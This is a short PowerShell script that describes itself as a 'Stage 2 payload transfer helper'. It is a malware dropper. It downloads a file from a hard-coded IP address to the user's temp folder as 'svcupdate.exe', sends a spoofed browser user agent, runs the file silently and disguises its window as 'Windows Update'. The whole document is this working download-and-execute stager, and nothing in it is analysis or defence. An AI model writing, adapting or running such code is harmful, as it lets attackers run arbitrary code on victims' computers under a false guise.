
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.

.EXAMPLE
    PS> .\updater.ps1
#>
$Stage1Url = 'http://192.0.2.132/stage1.ps1'
$DownloadPath = "$env:TEMP\svcupdate.exe"
$RequestTimeout = 145
$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$StageResult = Invoke-PayloadFetch -SourceUrl $Stage1Url -DestinationPath $DownloadPath -TimeoutSec $RequestTimeout -UserAgent $UserAgent
if ($StageResult) {
    Start-Process -FilePath $DownloadPath -ErrorAction SilentlyContinue
}

$Host.UI.RawUI.WindowTitle = "Windows Update"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
